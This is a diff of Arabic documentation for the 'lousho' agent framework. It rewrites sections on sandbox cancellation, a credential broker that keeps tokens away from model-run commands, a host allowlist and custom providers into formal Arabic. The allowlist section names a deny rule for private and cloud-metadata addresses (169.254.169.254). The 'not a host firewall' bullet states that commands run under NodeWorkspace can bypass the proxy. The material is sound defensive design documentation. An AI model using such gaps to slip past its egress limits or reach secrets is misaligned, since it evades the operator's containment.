-لما يُلغى الـrun، يمرّر `SandboxShell` إشارة الإلغاء للـadapter. عندها `SubprocessSandbox` يقتل الـcontainer ويحذفه، وأداة الـshell تبلّغ `aborted: true`؛ والإشارة اللي ملغاة أصلًا ما تشغّل أي container. الـadapter اللي يتجاهل `SandboxRunOptions.signal` ما يُنتظَر بعدها، لكن أمره يكمل شغال حتى تنتهي مهلته؛ وأداة الـshell دائمًا تحدد مهلة.
+عندما يُلغى الـrun، يمرّر `SandboxShell` إشارة الإلغاء إلى الـadapter. حينها يقتل `SubprocessSandbox` الـcontainer ويحذفه، وتبلّغ أداة الـshell عن `aborted: true`؛ والإشارة الملغاة مسبقًا لا تشغّل أي container. والـadapter الذي يتجاهل `SandboxRunOptions.signal` لا يُنتظَر بعدها، لكن أمره يستمر في العمل حتى تنتهي مهلته؛ وتحدد أداة الـshell دائمًا مهلة.
 
 ### Credential broker
 
-أحيانًا أمر يشغّله الـmodel (`git` أو `curl` أو سكربت) يحتاج ينادي API يتطلب auth، لكن أي token في بيئته يقدر الـmodel يقراه. `createCredentialBroker()` يخلي الـtoken على الـhost: يشغّل HTTP proxy محلي يضيف headers الـauth للطلبات الموجهة للـhosts اللي تسمّيها، فالأمر ما يشوف إلا عنوان الـproxy.
+أحيانًا يحتاج أمر يشغّله الـmodel (`git` أو `curl` أو سكربت) إلى استدعاء API يتطلب auth، لكن أي token في بيئته يستطيع الـmodel قراءته. يُبقي `createCredentialBroker()` الـtoken على الـhost: يشغّل HTTP proxy محليًا يضيف headers الـauth إلى الطلبات الموجهة إلى الـhosts التي تسمّيها، فلا يرى الأمر إلا عنوان الـproxy.
 
 ```ts
 import { createCredentialBroker, NodeWorkspace } from 'lousho';
@@ -331,16 +331,16 @@ await workspace.exec(`curl -s ${broker.baseUrl('api.github.com')}/user`);
 await broker.close();
 ```
 
-- **اللي يرجعه.** `url` (الـproxy، على port مؤقت على `127.0.0.1` افتراضيًا)، و`env` (`HTTP_PROXY` و`HTTPS_PROXY` و`NO_PROXY` وصيغها الصغيرة، لخيار `env` في `NodeWorkspace` أو `SandboxShell`)، و`baseUrl(host)`، و`close()` اللي يوقف الـlistener ويغلق الـsockets المفتوحة. قيمة الـheader تكون string أو دالة تُنادى مع كل طلب.
-- **الـallowlist.** hosts القواعد (أسماء مطابقة تمامًا أو `*.suffix`، وهذه تطابق الـsubdomains فقط — `*.example.com` ما يطابق `example.com`) مسموحة ضمنيًا؛ و`allow` يضيف hosts توصل بدون headers محقونة. أي host ثاني ياخذ 403 قبل ما ينفتح أي اتصال. الـhosts اللي تحلّ إلى loopback أو link-local (مثل عنوان metadata السحابي `169.254.169.254`) أو عناوين خاصة تُرفض إلا إذا مدرجة في `allowPrivate`، فالأمر ما يقدر يستخدم الـproxy للوصول لخدمات على جهازك أو شبكتك.
-- **الأسرار تبقى على الـhost.** القيم المحقونة ما تظهر أبدًا في `env`، ولا في ردود خطأ الـproxy، ولا في أي log. الطلب الموجه لـhost يخدمه الـbroker واللي يحمل أصلًا header `Authorization` يُحذف ويُستبدل. الـhop-by-hop headers (`Connection` و`Proxy-Authorization` وغيرها) ما تُمرَّر.
-- **قيد HTTPS.** حقن الـheaders يشتغل على طلبات HTTP العادية وعلى صيغة المسار: الـbroker يخدم `http://127.0.0.1:<port>/__broker/<host>/<path>` ويمرّره إلى `https://<host>/<path>` مع إضافة الـheaders، وهذا اللي يرجعه `baseUrl(host)`. وجّه أي أداة لذلك الـbase URL (مثل خيار `baseURL` في SDK معيّن، أو URL لأمر `curl`) حتى تاخذ auth بدون ما تمسك الـtoken. أما client يستخدم `HTTPS_PROXY` مع عنوان `https://` فيفتح نفق `CONNECT` بدلًا: الـbroker يفحص الـallowlist على هدف النفق ويمرّر البايتات المشفرة كما هي، فما ينضاف أي header. الـbroker ما يعترض TLS.
-- **ليس جدارًا ناريًا على الـhost.** أمر ينفّذه `NodeWorkspace` يقدر يتجاهل متغيرات الـproxy ويفتح اتصالاته بنفسه؛ الـallowlist تغطي فقط الترافيك المار عبر الـbroker. اللي يضمنه الـbroker هو أن الـtoken ما يكون أبدًا في متناول الأمر.
-- **الـcontainers.** لا تمرّر `broker.env` لـ`SubprocessSandbox`: هو يشير لـloopback الـhost. مرّر الـbroker نفسه بدلًا منه، `new SubprocessSandbox({ network: { allow }, broker })`، والـsandbox يوجّه الـcontainers عبره (راجع [Allowlisted egress](#allowlisted-egress-network--allow--with-a-broker)). يسوي هذا بـ`broker.listen({ host, clients, allow })` اللي يضيف listener على عنوان ثاني يخدم فقط الـpeers من subnet `clients`، وقائمته هي hosts القواعد زائد `allow`. الـbroker ما يستمع إلا على loopback إلا إذا ناديت هذه الدالة.
+- **ما يُرجعه.** `url` (الـproxy، على port مؤقت على `127.0.0.1` افتراضيًا)، و`env` (`HTTP_PROXY` و`HTTPS_PROXY` و`NO_PROXY` وصيغها الصغيرة، لخيار `env` في `NodeWorkspace` أو `SandboxShell`)، و`baseUrl(host)`، و`close()` الذي يوقف الـlistener ويغلق الـsockets المفتوحة. وتكون قيمة الـheader string أو دالة تُستدعى مع كل طلب.
+- **الـallowlist.** hosts القواعد (أسماء مطابقة تمامًا أو `*.suffix`، وهذه تطابق الـsubdomains فقط — `*.example.com` لا يطابق `example.com`) مسموحة ضمنيًا؛ ويضيف `allow` hosts يمكن الوصول إليها بدون headers محقونة. وأي host آخر يحصل على 403 قبل فتح أي اتصال. والـhosts التي تُحلّ إلى loopback أو link-local (مثل عنوان metadata السحابي `169.254.169.254`) أو إلى عناوين خاصة تُرفض ما لم تكن مدرجة في `allowPrivate`، فلا يستطيع الأمر استخدام الـproxy للوصول إلى خدمات على جهازك أو شبكتك.
+- **تبقى الأسرار على الـhost.** لا تظهر القيم المحقونة أبدًا في `env`، ولا في ردود خطأ الـproxy، ولا في أي log. والطلب الموجه إلى host يخدمه الـbroker والذي يحمل أصلًا header `Authorization` يُحذف منه هذا الـheader ويُستبدل. ولا تُمرَّر الـhop-by-hop headers (`Connection` و`Proxy-Authorization` وغيرها).
+- **قيد HTTPS.** يعمل حقن الـheaders على طلبات HTTP العادية وعلى صيغة المسار: يخدم الـbroker `http://127.0.0.1:<port>/__broker/<host>/<path>` ويمرّره إلى `https://<host>/<path>` مع إضافة الـheaders، وهذا ما يُرجعه `baseUrl(host)`. وجّه أي أداة إلى ذلك الـbase URL (مثل خيار `baseURL` في SDK معيّن، أو URL لأمر `curl`) لكي تحصل على auth بدون أن تمسك بالـtoken. أما الـclient الذي يستخدم `HTTPS_PROXY` مع عنوان `https://` فيفتح نفق `CONNECT` بدلًا من ذلك: يفحص الـbroker الـallowlist على هدف النفق ويمرّر البايتات المشفرة كما هي، فلا يُضاف أي header. ولا يعترض الـbroker الـTLS.
+- **ليس جدارًا ناريًا على الـhost.** يستطيع الأمر الذي ينفّذه `NodeWorkspace` تجاهل متغيرات الـproxy وفتح اتصالاته بنفسه؛ ولا تغطي الـallowlist إلا الترافيك المار عبر الـbroker. وما يضمنه الـbroker هو أن الـtoken لا يكون أبدًا في متناول الأمر.
+- **الـcontainers.** لا تمرّر `broker.env` إلى `SubprocessSandbox`: فهو يشير إلى loopback الـhost. مرّر الـbroker نفسه بدلًا منه، `new SubprocessSandbox({ network: { allow }, broker })`، ويوجّه الـsandbox الـcontainers عبره (راجع [Allowlisted egress](#allowlisted-egress-network--allow--with-a-broker)). ويفعل ذلك بـ`broker.listen({ host, clients, allow })` التي تضيف listener على عنوان آخر لا يخدم إلا الـpeers من subnet `clients`، وقائمته هي hosts القواعد إضافةً إلى `allow`. ولا يستمع الـbroker إلا على loopback ما لم تستدعِ هذه الدالة.
 
-## اكتب provider خاص بك
+## اكتب provider خاصًا بك
 
-الواجهتان صغيرتان. المسارات نسبية للـworkspace وتستخدم `/`. `normalizeWorkspacePath()` يطبّق نفس الفحوص اللي تستخدمها الـproviders المدمجة. الـprovider المكشوف لـmodel لازم يحصر المسارات بنفسه، لأن أداة مخصصة ممكن تناديه مباشرة. عند الفشل ارمِ `WorkspaceError` برسالة مفهومة.
+الواجهتان صغيرتان. المسارات نسبية إلى الـworkspace وتستخدم `/`. يطبّق `normalizeWorkspacePath()` الفحوص نفسها التي تستخدمها الـproviders المدمجة. ويجب أن يحصر الـprovider المكشوف لـmodel المسارات بنفسه، لأن أداة مخصصة قد تستدعيه مباشرة. وعند الفشل ارمِ `WorkspaceError` برسالة مفهومة.
 
 ```ts
 import { normalizeWorkspacePath, WorkspaceError, type FsProvider, type ShellProvider } from 'lousho';
@@ -381,13 +381,13 @@ export const remoteShell: ShellProvider = {
 };
 ```
 
-فيه دالتان اختياريتان، `getMode(path)` و`chmod(path, mode)`، تخلي `WorkspaceCheckpoints` يستعيد بتات صلاحيات الملف مع محتواه؛ بدونها الـrewind يرجّع المحتوى فقط. ودالة ثالثة، `readFileBytes(path)`، ترجع البايتات الخام للملف: معها ترفض `edit_file` الملف اللي مو UTF-8 صالح (أو فيه BOM لـUTF-16) بدل ما تكتب U+FFFD فوق كل بايت ما قدرت تفك ترميزه.
+توجد دالتان اختياريتان، `getMode(path)` و`chmod(path, mode)`، تسمحان لـ`WorkspaceCheckpoints` باستعادة بتات صلاحيات الملف مع محتواه؛ وبدونهما يُعيد الـrewind المحتوى فقط. ودالة ثالثة، `readFileBytes(path)`، تُرجع البايتات الخام للملف: معها ترفض `edit_file` الملف الذي ليس UTF-8 صالحًا (أو فيه BOM لـUTF-16) بدلًا من أن تكتب U+FFFD فوق كل بايت لم تستطع فك ترميزه.
 
-`ShellProvider.exec` لازم ترجّع نتيجة (resolve) مو ترفض (reject) عند exit code غير صفري، أو timeout (`timedOut: true`)، أو إلغاء (`aborted: true`). ولا ترفض إلا إذا تعذّر بدء الأمر أصلًا.
+يجب أن تُرجع `ShellProvider.exec` نتيجة (resolve) لا أن ترفض (reject) عند exit code غير صفري، أو timeout (`timedOut: true`)، أو إلغاء (`aborted: true`). ولا ترفض إلا إذا تعذّر بدء الأمر أصلًا.
 
 ## الاختبار بـ`MemoryWorkspace`
 
-`MemoryWorkspace` يحتفظ بشجرة الملفات في الذاكرة ويفحص المسارات بنفس الطريقة. `exec` فيه stub تبرمجه إنت، وكل أمر يستلمه يُسجَّل. ادمجه مع `mockModel` لاختبارات deterministic:
+يحتفظ `MemoryWorkspace` بشجرة الملفات في الذاكرة ويفحص المسارات بالطريقة نفسها. فيه `exec` كـstub تبرمجه أنت، ويُسجَّل كل أمر يستلمه. ادمجه مع `mockModel` لاختبارات deterministic:
 
 ```ts
 import { createAgent, createFsTools, createShellTool, MemoryWorkspace } from 'lousho';
